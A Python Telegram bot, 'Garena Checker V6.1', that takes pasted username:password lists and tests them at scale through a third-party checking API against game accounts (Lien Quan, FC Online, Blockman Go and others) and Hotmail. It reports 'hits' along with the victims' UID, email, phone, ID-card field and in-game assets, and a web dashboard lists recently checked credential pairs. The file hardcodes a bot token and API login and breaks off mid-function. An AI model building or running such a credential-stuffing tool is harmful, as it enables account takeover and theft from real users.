# ========================================================================
#    GARENA CHECKER BOT V6.1 - FULL INFO + CHECK NHIEU + THONG KE
# ========================================================================

import subprocess, sys, importlib, threading, time, json, os, re, telebot, requests
import struct, math, random, signal, gc
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import defaultdict
from http.server import HTTPServer, BaseHTTPRequestHandler

def install_package(pkg):
    try: importlib.import_module(pkg)
    except: subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--no-cache-dir"])

for pkg in ["requests", "pyTelegramBotAPI"]: install_package(pkg)

# ========== BIEN TOAN CUC ==========
CUSTOM_AUDIO_PATH = "custom_audio.wav"
CUSTOM_AUDIO_DATA = None
AUDIO_LOCK = threading.Lock()
STATS_FILE = "check_stats.json"

SESSION_STATS = {
    "total_checked": 0, "total_hits": 0, "total_dead": 0, "total_errors": 0,
    "session_start": time.time(), "accounts_checked": [], "recent_checks": []
}
SESSION_LOCK = threading.Lock()

def load_stats():
    try:
        if os.path.exists(STATS_FILE):
            with open(STATS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except: pass
    return {"total_checked": 0, "total_hits": 0, "total_dead": 0, "total_errors": 0, 
            "last_check": None, "history": []}

def save_stats(data):
    try:
        with open(STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(data, f, ensure_ascii=False, indent=2)
    except: pass

def update_stats(hit=0, dead=0, err=0, accounts=None, details=None):
    data = load_stats()
    data["total_checked"] += hit + dead + err
    data["total_hits"] += hit
    data["total_dead"] += dead
    data["total_errors"] += err
    data["last_check"] = datetime.now().isoformat()
    if accounts:
        data["history"].append({
            "time": datetime.now().isoformat(),
            "total": len(accounts), "hits": hit, "dead": dead, "errors": err
        })
        if len(data["history"]) > 50:
            data["history"] = data["history"][-50:]
    with SESSION_LOCK:
        SESSION_STATS["total_checked"] += hit + dead + err
        SESSION_STATS["total_hits"] += hit
        SESSION_STATS["total_dead"] += dead
        SESSION_STATS["total_errors"] += err
        if details:
            SESSION_STATS["accounts_checked"].extend(details)
            SESSION_STATS["recent_checks"].extend(details[-10:])
            if len(SESSION_STATS["accounts_checked"]) > 1000:
                SESSION_STATS["accounts_checked"] = SESSION_STATS["accounts_checked"][-1000:]
            if len(SESSION_STATS["recent_checks"]) > 50:
                SESSION_STATS["recent_checks"] = SESSION_STATS["recent_checks"][-50:]
    save_stats(data)
    return data

# ========== WEB SERVER ==========
class RenderHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()
            self.wfile.write(self.generate_dashboard().encode('utf-8'))
        elif self.path == '/stats':
            self.send_response(200)
            self.send_header('Content-type', 'application/json; charset=utf-8')
            self.end_headers()
            data = load_stats()
            with SESSION_LOCK:
                session_data = {
                    "session": SESSION_STATS,
                    "uptime": time.time() - start_time,
                    "is_checking": checking
                }
            self.wfile.write(json.dumps({
                "status": "alive", "checking": checking, "stats": stats,
                "services": list(SERVICE_ROUTES.keys()), "admin": ADMIN_USERNAME,
                "version": "6.1", "total_stats": data, "session_stats": session_data
            }, ensure_ascii=False).encode('utf-8'))
        elif self.path == '/api/stats/detailed':
            self.send_response(200)
            self.send_header('Content-type', 'application/json; charset=utf-8')
            self.end_headers()
            with SESSION_LOCK:
                session_data = {
                    "session": SESSION_STATS,
                    "uptime": time.time() - start_time,
                    "current_time": datetime.now().isoformat(),
                    "is_checking": checking,
                    "services": list(SERVICE_ROUTES.keys()),
                    "recent_accounts": SESSION_STATS["recent_checks"][-50:]
                }
            self.wfile.write(json.dumps(session_data, ensure_ascii=False).encode('utf-8'))
        elif self.path == '/audio' or self.path == '/audio.mp3':
            self.send_response(200)
            self.send_header('Content-type', 'audio/wav' if self.path == '/audio' else 'audio/mpeg')
            self.send_header('Cache-Control', 'no-cache')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(self.get_audio_data())
        else:
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is running!")
    
    def get_audio_data(self):
        global CUSTOM_AUDIO_DATA
        with AUDIO_LOCK:
            if CUSTOM_AUDIO_DATA:
                return CUSTOM_AUDIO_DATA
        return self.generate_default_audio()
    
    def generate_default_audio(self):
        try:
            sr, dur = 44100, 30.0
            samples = int(sr * dur)
            buf = bytearray()
            for i in range(samples):
                t = i / sr
                v = int(32767 * 0.3 * (
                    math.sin(2 * math.pi * 440 * t) * 0.4 +
                    math.sin(2 * math.pi * 554 * t) * 0.3 +
                    math.sin(2 * math.pi * 659 * t) * 0.2 +
                    math.sin(2 * math.pi * 880 * t) * 0.15 +
                    math.sin(2 * math.pi * 1100 * t) * 0.1 +
                    math.sin(2 * math.pi * 220 * t) * 0.2
                ))
                buf += struct.pack('<h', v)
            hdr = b'RIFF' + struct.pack('<I', 36 + len(buf)) + b'WAVEfmt ' + \
                  struct.pack('<IHHIIHH', 16, 1, 1, sr, sr * 2, 2, 16) + \
                  b'data' + struct.pack('<I', len(buf))
            return hdr + bytes(buf)
        except:
            return b''
    
    def generate_dashboard(self):
        global checking
        uptime_str = time.strftime("%H:%M:%S", time.gmtime(time.time() - start_time))
        with SESSION_LOCK:
            s_hits, s_dead, s_err, s_chk = (
                SESSION_STATS["total_hits"], SESSION_STATS["total_dead"],
                SESSION_STATS["total_errors"], SESSION_STATS["total_checked"]
            )
        data = load_stats()
        services_html = "".join([
            f'<div class="sc"><span class="si">{v["icon"]}</span>'
            f'<span class="sn">{k}</span><span class="sd">{v["desc"]}</span></div>'
            for k, v in SERVICE_ROUTES.items()
        ])
        status_text = '🔴 Dang check' if checking else '🟢 San sang'
        bg_color = '#ff9800' if checking else '#4caf50'
        
        return f'''<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>GARENA CHECKER V6.1</title>
<style>*{{margin:0;padding:0;box-sizing:border-box}}body{{background:#0a0a0a;color:#0f0;font-family:monospace;overflow:hidden}}
#bg,#matrix,#laser{{position:fixed;top:0;left:0;width:100%;height:100%;z-index:0}}
#matrix{{opacity:.12}}#laser{{z-index:1;pointer-events:none}}
.container{{position:relative;z-index:2;max-width:1100px;margin:15px auto;padding:20px;max-height:98vh;overflow-y:auto}}
.header{{text-align:center;padding:25px;background:rgba(0,0,0,.85);border-radius:20px;border:2px solid #0f0;box-shadow:0 0 50px rgba(0,255,0,.15)}}
.title{{font-size:2.5em;font-weight:900;color:#0f0;text-shadow:0 0 20px rgba(0,255,0,.8),3px 3px 0 #f0f,-3px -3px 0 #0ff}}
.subtitle{{color:#8f8;font-size:.9em}}
.stats-grid{{display:grid;grid-template-columns:repeat(6,1fr);gap:10px;margin:15px 0}}
.stat-card{{background:rgba(0,255,0,.04);border-radius:10px;padding:12px;text-align:center;border:1px solid rgba(0,255,0,.15)}}
.stat-value{{font-size:1.6em;font-weight:900}}
.stat-label{{font-size:.6em;color:#8a8;text-transform:uppercase}}
.hits{{color:#0f0}}.dead{{color:#f44}}.error{{color:#f63}}.checked{{color:#0cf}}.total{{color:#f0f}}.totalchk{{color:#fa0}}
.detail-stats{{background:rgba(0,0,0,.7);border-radius:10px;padding:15px;margin:15px 0;border:1px solid rgba(0,255,0,.1);display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:8px}}
.detail-row{{display:flex;justify-content:space-between;padding:4px 0;border-bottom:1px solid rgba(0,255,0,.05);font-size:.85em}}
.detail-row span:first-child{{color:#8a8}}
.section-title{{font-size:1.4em;text-align:center;margin:20px 0 12px;color:#0f0}}
.services-grid{{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:10px;margin-bottom:15px}}
.sc{{background:rgba(0,0,0,.7);border-radius:10px;padding:12px 14px;display:flex;align-items:center;gap:10px;border:1px solid rgba(0,255,0,.08);cursor:pointer;transition:.3s}}
.sc:hover{{border-color:#0f0;transform:scale(1.03)}}
.si{{font-size:1.6em}}.sn{{font-weight:700;color:#fff}}.sd{{font-size:.65em;color:#8a8}}
.recent-checks{{background:rgba(0,0,0,.5);border-radius:10px;padding:12px;margin:12px 0;border:1px solid rgba(0,255,0,.08);max-height:180px;overflow-y:auto}}
.recent-item{{display:flex;justify-content:space-between;padding:3px 8px;font-size:.7em;border-bottom:1px solid rgba(0,255,0,.03)}}
.status-hit{{color:#0f0}}.status-dead{{color:#f44}}.status-error{{color:#f63}}
.footer{{text-align:center;padding:12px;color:#464;font-size:.7em;border-top:1px solid rgba(0,255,0,.06);margin-top:12px}}
.audio-ind{{display:inline-block;padding:4px 14px;border-radius:50px;font-size:.8em;background:rgba(0,255,0,.1);border:1px solid #0f0;color:#0f0;margin-top:8px}}
.dot{{display:inline-block;width:8px;height:8px;background:#0f0;border-radius:50%;margin-right:8px;animation:dotPulse 1s infinite}}
@keyframes dotPulse{{0%,100%{{transform:scale(1)}}50%{{transform:scale(1.6)}}}}
.status-badge{{display:inline-block;padding:8px 20px;border-radius:50px;font-weight:700;margin-top:10px;background:{bg_color};color:#fff}}
@media(max-width:768px){{.stats-grid{{grid-template-columns:repeat(3,1fr)}}.title{{font-size:1.8em}}}}
</style></head>
<body>
<canvas id="bg"></canvas><canvas id="matrix"></canvas><canvas id="laser"></canvas>
<div class="container">
<div class="header"><div class="title">🎮 GARENA CHECKER</div>
<div class="subtitle">Version 6.1 - HACKER EDITION | Admin: @baohuyno1</div>
<div class="status-badge" id="status">{status_text}</div>
<div class="audio-ind"><span class="dot"></span> 🔊 AM THANH DANG PHAT</div>
<div class="subtitle" style="font-size:.7em;color:#464;margin-top:4px">⏱ Uptime: {uptime_str}</div></div>
<div class="stats-grid">
<div class="stat-card"><div class="stat-value hits">{s_hits}</div><div class="stat-label">🎯 Hits</div></div>
<div class="stat-card"><div class="stat-value dead">{s_dead}</div><div class="stat-label">❌ Dead</div></div>
<div class="stat-card"><div class="stat-value error">{s_err}</div><div class="stat-label">⚠️ Errors</div></div>
<div class="stat-card"><div class="stat-value checked">{s_chk}</div><div class="stat-label">🔄 Checked</div></div>
<div class="stat-card"><div class="stat-value total">{data.get("total_hits",0)}</div><div class="stat-label">🏆 Tong Hits</div></div>
<div class="stat-card"><div class="stat-value totalchk">{data.get("total_checked",0)}</div><div class="stat-label">📊 Tong Check</div></div>
</div>
<div class="detail-stats">
<div class="detail-row"><span>✅ Hits:</span><span class="hits">{s_hits}</span></div>
<div class="detail-row"><span>❌ Dead:</span><span class="dead">{s_dead}</span></div>
<div class="detail-row"><span>⚠️ Errors:</span><span class="error">{s_err}</span></div>
<div class="detail-row"><span>📊 Checked:</span><span class="checked">{s_chk}</span></div>
<div class="detail-row"><span>🏆 Tong Hits:</span><span class="total">{data.get("total_hits",0)}</span></div>
<div class="detail-row"><span>📊 Tong Check:</span><span class="totalchk">{data.get("total_checked",0)}</span></div>
</div>
<div class="section-title">📋 DICH VU HO TRO</div>
<div class="services-grid">{services_html}</div>
<div class="section-title">📜 RECENT CHECKS</div>
<div class="recent-checks" id="recent"><div style="text-align:center;color:#464;padding:10px">Loading...</div></div>
<div class="footer">© 2024 <a href="https://t.me/baohuyno1" style="color:#0f0">@baohuyno1</a> | 3D EFFECTS | AUTO AUDIO | FULL INFO</div>
</div>
<audio id="audio" loop autoplay><source src="/audio" type="audio/wav"><source src="/audio.mp3" type="audio/mpeg"></audio>
<script>
const bg=document.getElementById('bg'),bctx=bg.getContext('2d');bg.width=innerWidth;bg.height=innerHeight;
let pts=[];for(let i=0;i<120;i++)pts.push({x:Math.random()*bg.width,y:Math.random()*bg.height,z:Math.random()*300+50,s:Math.random()*3+1,sp:Math.random()*.5+.1,c:`hsl(${120+Math.random()*60},100%,${40+Math.random()*30}%)`,o:Math.random()*.8+.2});
function drawBg(){bctx.fillStyle='rgba(10,10,10,.3)';bctx.fillRect(0,0,bg.width,bg.height);for(let p of pts){p.z-=p.sp;if(p.z<10){p.x=Math.random()*bg.width;p.y=Math.random()*bg.height;p.z=Math.random()*300+50}let sc=300/p.z,sx=p.x*sc+bg.width/2-p.x,sy=p.y*sc+bg.height/2-p.y,ss=p.s*sc;bctx.fillStyle=p.c;bctx.globalAlpha=p.o*(300/p.z);bctx.beginPath();bctx.arc(sx,sy,ss,0,Math.PI*2);bctx.fill()}bctx.globalAlpha=1;requestAnimationFrame(drawBg)}drawBg();
const m=document.getElementById('matrix'),mctx=m.getContext('2d');m.width=innerWidth;m.height=innerHeight;const ch='ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()',fs=13,cols=Math.ceil(m.width/fs),drops=[];for(let i=0;i<cols;i++)drops[i]=Math.random()*-100;
setInterval(()=>{mctx.fillStyle='rgba(0,0,0,.05)';mctx.fillRect(0,0,m.width,m.height);for(let i=0;i<drops.length;i++){mctx.fillStyle=Math.random()>.92?'#fff':'#0f0';mctx.font=fs+'px monospace';mctx.fillText(ch[Math.floor(Math.random()*ch.length)],i*fs,drops[i]*fs);if(drops[i]*fs>m.height&&Math.random()>.975)drops[i]=0;drops[i]++}},50);
const l=document.getElementById('laser'),lctx=l.getContext('2d');l.width=innerWidth;l.height=innerHeight;const lc=['#0f0','#0ff','#f0f','#ff0','#f44','#4f4','#f80'];let lasers=[];
class Laser{constructor(x,y){this.x=x||Math.random()*l.width;this.y=y||Math.random()*l.height;this.tx=Math.random()*l.width;this.ty=Math.random()*l.height;this.c=lc[Math.floor(Math.random()*lc.length)];this.w=Math.random()*2+.5;this.life=0;this.max=Math.random()*60+30;this.pts=[]}update(){this.life++;if(Math.random()>.4)this.pts.push({x:this.x+(this.tx-this.x)*Math.random(),y:this.y+(this.ty-this.y)*Math.random(),vx:(Math.random()-.5)*2,vy:(Math.random()-.5)*2,life:0,max:Math.random()*20+10});for(let i=this.pts.length-1;i>=0;i--){let p=this.pts[i];p.x+=p.vx;p.y+=p.vy;p.life++;if(p.life>p.max)this.pts.splice(i,1)}if(this.life>this.max){let idx=lasers.indexOf(this);if(idx>-1)lasers.splice(idx,1)}}draw(ctx){let p=this.life/this.max,a=p<.1?p*10:p>.9?(1-p)*10:1,g=ctx.createLinearGradient(this.x,this.y,this.tx,this.ty);g.addColorStop(0,this.c+'00');g.addColorStop(.5,this.c+'FF');g.addColorStop(1,this.c+'00');ctx.strokeStyle=g;ctx.lineWidth=this.w;ctx.globalAlpha=a;ctx.shadowColor=this.c;ctx.shadowBlur=12;ctx.beginPath();ctx.moveTo(this.x,this.y);ctx.lineTo(this.tx,this.ty);ctx.stroke();ctx.shadowBlur=0;for(let p of this.pts){let pa=1-p.life/p.max;ctx.fillStyle=this.c;ctx.globalAlpha=pa*a;ctx.shadowColor=this.c;ctx.shadowBlur=6;ctx.beginPath();ctx.arc(p.x,p.y,Math.random()*2+1,0,Math.PI*2);ctx.fill()}ctx.globalAlpha=1}}
function addLaser(x,y){if(lasers.length<80)lasers.push(new Laser(x,y))}
function drawLasers(){lctx.clearRect(0,0,l.width,l.height);for(let ls of lasers){ls.update();ls.draw(lctx)}if(Math.random()>.97){let fx=Math.random()*l.width,fy=Math.random()*l.height,fr=Math.random()*35+15,fc=lc[Math.floor(Math.random()*lc.length)],g=lctx.createRadialGradient(fx,fy,0,fx,fy,fr);g.addColorStop(0,fc+'FF');g.addColorStop(1,fc+'00');lctx.fillStyle=g;lctx.beginPath();lctx.arc(fx,fy,fr,0,Math.PI*2);lctx.fill()}requestAnimationFrame(drawLasers)}
for(let i=0;i<15;i++)addLaser();drawLasers();
document.addEventListener('mousemove',e=>{if(Math.random()>.88){addLaser(e.clientX,e.clientY);if(lasers.length>80)lasers.shift()}});
document.addEventListener('click',e=>{for(let i=0;i<6;i++)addLaser(e.clientX,e.clientY);if(lasers.length>80)lasers.splice(0,6)});
const audio=document.getElementById('audio');
function playAudio(){audio.volume=.3;audio.loop=true;audio.setAttribute('autoplay','');audio.play().then(()=>console.log('🎵 Audio OK')).catch(()=>{document.addEventListener('click',()=>{audio.play().catch(()=>{});document.removeEventListener('click',arguments.callee)},{once:true});setTimeout(()=>audio.play().catch(()=>{}),1000);setTimeout(()=>audio.play().catch(()=>{}),3000)})}
audio.addEventListener('canplaythrough',()=>{if(audio.paused)audio.play().catch(()=>{})});
audio.addEventListener('error',()=>{setTimeout(()=>{audio.load();setTimeout(()=>audio.play().catch(()=>{}),500)},1000)});
setTimeout(playAudio,300);
setInterval(()=>{if(audio.paused&&!audio.ended&&audio.readyState>=2)audio.play().catch(()=>{});if(audio.error){audio.load();setTimeout(()=>audio.play().catch(()=>{}),500)}},2000);
document.addEventListener('visibilitychange',()=>{if(!document.hidden&&audio.paused)audio.play().catch(()=>{})});
function updateStats(){fetch('/stats').then(r=>r.json()).then(d=>{document.querySelector('.hits').textContent=d.session_stats?.session?.total_hits||0;document.querySelector('.dead').textContent=d.session_stats?.session?.total_dead||0;document.querySelector('.error').textContent=d.session_stats?.session?.total_errors||0;document.querySelector('.checked').textContent=d.session_stats?.session?.total_checked||0;document.querySelectorAll('.total')[0].textContent=d.total_stats?.total_hits||0;document.querySelectorAll('.totalchk')[0].textContent=d.total_stats?.total_checked||0;document.getElementById('status').textContent=d.checking?'🔴 Dang check':'🟢 San sang';document.getElementById('status').style.background=d.checking?'#ff9800':'#4caf50'}).catch(()=>{})}
fetch('/api/stats/detailed').then(r=>r.json()).then(d=>{let html='';let recent=d.recent_accounts||[];if(!recent.length)html='<div style="text-align:center;color:#464;padding:10px">Chua co acc nao duoc check</div>';else{for(let item of recent.slice(-20).reverse()){let cls=item.status==='hit'?'status-hit':item.status==='dead'?'status-dead':'status-error';let icon=item.status==='hit'?'✅':item.status==='dead'?'❌':'⚠️';html+=`<div class="recent-item"><span class="${cls}">${icon} ${item.user}:{item.pwd}</span><span style="color:#464;font-size:.8em">${item.time||''}</span></div>`}}document.getElementById('recent').innerHTML=html}).catch(()=>{});
setInterval(updateStats,3000);updateStats();
console.log('🔥 GARENA CHECKER V6.1 LOADED');
</script></body></html>'''
    
    def log_message(self, format, *args): pass

def start_server():
    global start_time, CUSTOM_AUDIO_DATA
    start_time = time.time()
    if os.path.exists(CUSTOM_AUDIO_PATH):
        try:
            with open(CUSTOM_AUDIO_PATH, 'rb') as f:
                CUSTOM_AUDIO_DATA = f.read()
            print(f"[*] Load audio custom: {len(CUSTOM_AUDIO_DATA)} bytes")
        except: pass
    try:
        port = int(os.environ.get("PORT", 10000))
        server = HTTPServer(("0.0.0.0", port), RenderHandler)
        print(f"[*] Web server: http://0.0.0.0:{port}")
        print(f"[*] Audio: http://0.0.0.0:{port}/audio")
        server.serve_forever()
    except Exception as e:
        print(f"[!] Web error: {e}")

threading.Thread(target=start_server, daemon=True).start()

# ========== CAU HINH ==========
TELEGRAM_BOT_TOKEN = "6367532329:AAEem2DziNWKZtFrA8goj5PGTOI4MVT7IKA"
ADMIN_CHAT_ID = "5736655322"
ADMIN_USERNAME = "baohuyno1"
REQUIRED_CHANNEL = "@hakiiosvip"
REQUIRED_CHANNEL_URL = "https://t.me/hakiiosvip"
API_BASE = "https://lol.nhatminh301.com"
API_USERNAME = "thaituduc"
API_PASSWORD = "thaituduc"

DEFAULT_THREADS = 50
CHECKMULTI_THREADS = 30
CHECKMULTI_BATCH_SIZE = 10
CHECKMULTI_BATCH_DELAY = 3.0
MAX_MESSAGE_LENGTH = 4000

SERVICE_ROUTES = {
    "lienquan": {"route": "/api/lienquan", "desc": "Lien Quan Mobile", "icon": "🎮", "params": ["tk", "mk"]},
    "miniworld": {"route": "/api/miniworld", "desc": "Mini World", "icon": "🌍", "params": ["tk", "mk"]},
    "blockmango": {"route": "/api/blockmango", "desc": "Blockman Go", "icon": "🧱", "params": ["tk", "mk"]},
    "deltaforce": {"route": "/api/deltaforce", "desc": "Delta Force", "icon": "🔫", "params": ["tk", "mk"]},
    "hotmail": {"route": "/api/hotmail", "desc": "Hotmail", "icon": "📧", "params": ["tk", "mk"]},
    "fc": {"route": "/api/fc", "desc": "FC Online", "icon": "⚽", "params": ["tk", "mk"]},
    "fullpack": {"route": "/api/fullpack", "desc": "Fullpack", "icon": "📦", "params": ["tk", "mk"]}
}

checking = False
stop_event = threading.Event()
pending_accounts = {}
stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "unknown": 0, "start_time": 0}
file_lock = threading.Lock()
stats_lock = threading.Lock()
cache_results = {}
cache_lock = threading.Lock()
rate_lock = threading.Lock()
last_request_time = 0
start_time = time.time()
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")

# ========== UTILITY ==========
def fix_encoding(text):
    if not isinstance(text, str): return text
    replacements = {
        'Ã¡':'á','Ã ':'à','áº£':'ả','Ã£':'ã','áº¡':'ạ','Ä':'Đ','Ä':'Đ',
        'Æ°':'ư','Æ¡':'ơ','Ã´':'ô','Ã¢':'â','Äƒ':'ă','Ãª':'ê','Ã­':'í',
        'Ã¬':'ì','á»‹':'ị','á»‰':'ỉ','Ä©':'ĩ','Ã³':'ó','Ã²':'ò','Ãº':'ú',
        'Ã¹':'ù','Ã½':'ý','á»³':'ỳ','á»·':'ỷ','á»µ':'ỵ','Nghiá»‡p':'Nghiệp',
        'Hoáº£':'Hoả','YÃªu':'Yêu','Háº­u':'Hậu','Tháº¿':'Thế','Tá»­':'Tử',
        'Nguyá»‡t':'Nguyệt','Tá»™c':'Tộc','SiÃªu':'Siêu','viá»‡t':'việt',
        'KhÃ´ng':'Không','Äao':'Đao','phá»§':'phủ','táº­n':'tận','tháº¿':'thế',
        'Giai':'Giai','Ä‘iá»‡u':'điệu','GiÃ¡ng':'Giáng','Sinh':'Sinh',
        'Äá»“ng':'Đồng','phá»¥c':'phục','Cáº¥p':'Cấp','Tá»‘i':'Tối',
        'ThÆ°á»£ng':'Thượng','hÃ nh':'hành','K.CÆ°Æ¡ng':'K.Cương',
        'Tel\'Annas':'Tel\'Annas','VÅ©':'Vũ','khÃºc':'khúc','yÃªu':'yêu'
    }
    for old, new in replacements.items():
        text = text.replace(old, new)
    if any(c in text for c in ['Ã','Ä','Æ','á»','áº','Å©','Ä©']):
        try:
            text = text.encode('latin-1', errors='ignore').decode('utf-8', errors='ignore')
        except: pass
    return text

def format_value(v):
    if isinstance(v, bool): return "Yes" if v else "No"
    if isinstance(v, str) and v.lower() in ["true", "false"]:
        return "Yes" if v.lower() == "true" else "No"
    if v is None or v == "": return "N/A"
    return v

def safe_send(chat_id, text, parse="HTML"):
    if not text: return
    text = fix_encoding(text)
    if len(text) > MAX_MESSAGE_LENGTH:
        parts = []
        cur = ""
        for line in text.split('\n'):
            if len(cur) + len(line) + 1 > MAX_MESSAGE_LENGTH:
                parts.append(cur)
                cur = line + '\n'
            else:
                cur += line + '\n'
        if cur: parts.append(cur)
        for p in parts:
            try:
                bot.send_message(chat_id, p.strip(), parse_mode=parse)
                time.sleep(.1)
            except:
                try: bot.send_message(chat_id, p.strip())
                except: pass
    else:
        try:
            bot.send_message(chat_id, text, parse_mode=parse)
        except:
            try: bot.send_message(chat_id, text)
            except: pass

def is_member(user_id):
    try:
        s = bot.get_chat_member("@hakiiosvip", user_id).status
        return s in ['member', 'administrator', 'creator']
    except: return False

def check_membership(msg):
    if is_member(msg.from_user.id): return True
    mk = telebot.types.InlineKeyboardMarkup()
    mk.add(telebot.types.InlineKeyboardButton("📢 THAM GIA", url=REQUIRED_CHANNEL_URL))
    mk.add(telebot.types.InlineKeyboardButton("✅ DA THAM GIA", callback_data="check_join"))
    safe_send(msg.chat.id, f"🔒 <b>BAN CHUA THAM GIA KENH!</b>\n👉 {REQUIRED_CHANNEL_URL}")
    try:
        bot.send_message(msg.chat.id, "👇 Xac nhan:", reply_markup=mk)
    except: pass
    return False

@bot.callback_query_handler(func=lambda c: c.data == "check_join")
def cb_join(c):
    if is_member(c.from_user.id):
        bot.answer_callback_query(c.id, "✅ OK!")
        bot.delete_message(c.message.chat.id, c.message.message_id)
        safe_send(c.message.chat.id, "✅ <b>XAC NHAN THANH CONG!</b>")
    else:
        bot.answer_callback_query(c.id, "❌ Chua tham gia!", show_alert=True)

def loc_accounts(content):
    accounts, seen = [], set()
    pattern = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80}):([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
    for line in content.split('\n'):
        line = line.strip()
        if not line or re.match(r'^\d{1,2}:\d{2}(:\d{2})?$', line) or re.match(r'^\d+$', line):
            continue
        for u, p in re.findall(pattern, line):
            if len(u) >= 2 and len(p) >= 1 and not re.match(r'^\d+$', u) and not re.match(r'^\d+$', p):
                key = f"{u}:{p}"
                if key not in seen:
                    seen.add(key)
                    accounts.append((u, p))
    return accounts

# ========== CHECK API ==========
def check_api(user, pwd, service):
    cache_key = f"{user}:{pwd}:{service}"
    with cache_lock:
        if cache_key in cache_results:
            return cache_results[cache_key]
    
    info = SERVICE_ROUTES.get(service, {})
    url = f"{API_BASE}{info.get('route', '/api/lienquan')}"
    params = {
        "username": API_USERNAME,
        "password": API_PASSWORD,
        info.get('params', ['tk', 'mk'])[0]: user,
        info.get('params', ['tk', 'mk'])[1]: pwd
    }
    
    try:
        resp = requests.get(url, params=params, timeout=60)
        if resp.status_code == 200:
            try:
                data = resp.json()
                if isinstance(data, dict):
                    for k, v in data.items():
                        if isinstance(v, str):
                            data[k] = fix_encoding(v)
                    
                    hit = False
                    if data.get('status') in [True, "true", "success", "hit"]:
                        hit = True
                    elif data.get('success') in [True, "true"]:
                        hit = True
                    elif data.get('result') in ["hit", "success", "valid"]:
                        hit = True
                    elif any(k in data for k in ["uid", "name", "nickname", "aov_name", "email", "phone"]):
                        if data.get('status') != "dead":
                            hit = True
                    
                    data["result"] = "hit" if hit else "dead"
                    with cache_lock:
                        cache_results[cache_key] = data
                    return data
            except:
                text = resp.text.lower()
                result = {"result": "hit" if any(w in text for w in ["success", "ok", "true", "hit"]) else "dead"}
                with cache_lock:
                    cache_results[cache_key] = result
                return result
    except:
        pass
    
    result = {"result": "error"}
    with cache_lock:
        cache_results[cache_key] = result
    return result

def format_full_info(user, pwd, service, data):
    desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "✅")
    
    msg = f"{icon} <b>HIT - {desc}</b>\n"
    msg += f"🔑 <b>{user}:{pwd}</b>\n"
    
    fields = [
        ("👤 UID", "uid"), ("🌐 Region", "region"), ("💲 Sò", "shells"),
        ("🔥 NAME", "aov_name"), ("👑 RANK", "aov_rank"), ("✨ LEVEL", "aov_level"),
        ("💎 SKIN", "aov_total_skins"), ("💪 HERO", "aov_total_champs"),
        ("📩 EMAIL", "email_verified"), ("📱 SĐT", "mobile_bound"),
        ("🛡 PASS", "password_set"), ("🔗 FB", "fb_linked"),
        ("🚫 BAND", "banned"), ("⏰ Login cuối", "last_login"),
        ("📅 Tạo GR", "garena_created"), ("📄 CCCD", "cccd"),
        ("🛡 Authen", "authen"), ("📋 Tình Trạng", "tinh_trang")
    ]
    
    for label, key in fields:
        val = data.get(key)
        if val not in [None, "", "N/A", 0]:
            if isinstance(val, bool):
                val = "Yes" if val else "No"
            if str(val).lower() in ["true", "false"]:
                val = "Yes" if val == "true" else "No"
            if str(val).lower() in ["yes", "no"]:
                val = "Yes" if val == "yes" else "No"
            if isinstance(val, str):
                val = fix_encoding(val)
            if label == "📩 EMAIL" and data.get('email'):
                val = f"{val} [{data.get('email')}]"
            if label == "📱 SĐT" and data.get('phone'):
                val = f"{val} [{data.get('phone')}]"
            msg += f"  {label}: {val}\n"
    
    collections = [
        ("aov_ss_list", "✨ SS"),
        ("aov_anime_list", "🔥 Anime"),
        ("aov_other_list", "🎲 Other")
    ]
    for key, label in collections:
        lst = data.get(key, [])
        if lst:
            names = [fix_encoding(str(i)) for i in lst[:5]]
            more = f" +{len(lst)-5}" if len(lst) > 5 else ""
            msg += f"  {label}: {', '.join(names)}{more}\n"
    
    return msg

def format_dead(user, pwd, service):
    return f"❌ <b>DEAD - {SERVICE_ROUTES.get(service,{}).get('desc',service)}</b>\n🔑 <code>{user}:{pwd}</code>"

def format_error(user, pwd, service):
    return f"⚠️ <b>ERROR - {SERVICE_ROUTES.get(service,{}).get('desc',service)}</b>\n🔑 <code>{user}:{pwd}</code>"

# ========== COMMANDS ==========
@bot.message_handler(commands=['start'])
def cmd_start(msg):
    if not check_membership(msg): return
    safe_send(msg.chat.id, f"""🤖 <b>GARENA CHECKER V6.1</b>
👤 Admin: @baohuyno1 | 🎵 TikTok: @baohuy1109

📌 <b>LENH:</b>
/check user:pass - Check 1 acc
/checkmulti user1:pass1,user2:pass2 - Check nhieu
/checkall - Check tat ca service
/services - Danh sach service
/stats - Thong ke
/stop - Dung check

⚠️ KHONG LUU ACCOUNT | AUTO AUDIO | FULL INFO""")

@bot.message_handler(commands=['stats'])
def cmd_stats(msg):
    if not check_membership(msg): return
    data = load_stats()
    with SESSION_LOCK:
        s = SESSION_STATS
    safe_send(msg.chat.id, f"""📊 <b>THONG KE TONG</b>
━━━━━━━━━━━━━━━━
📦 Tong check: {data.get('total_checked',0)}
✅ Tong hits: {data.get('total_hits',0)}
❌ Tong dead: {data.get('total_dead',0)}
⚠️ Tong errors: {data.get('total_errors',0)}
━━━━━━━━━━━━━━━━
📊 <b>SESSION NAY</b>
✅ Hits: {s.get('total_hits',0)}
❌ Dead: {s.get('total_dead',0)}
⚠️ Errors: {s.get('total_errors',0)}
📦 Checked: {s.get('total_checked',0)}
⏰ Lan cuoi: {data.get('last_check','Chua co')}""")

@bot.message_handler(commands=['services'])
def cmd_services(msg):
    if not check_membership(msg): return
    m = "📋 <b>DICH VU HO TRO:</b>\n\n"
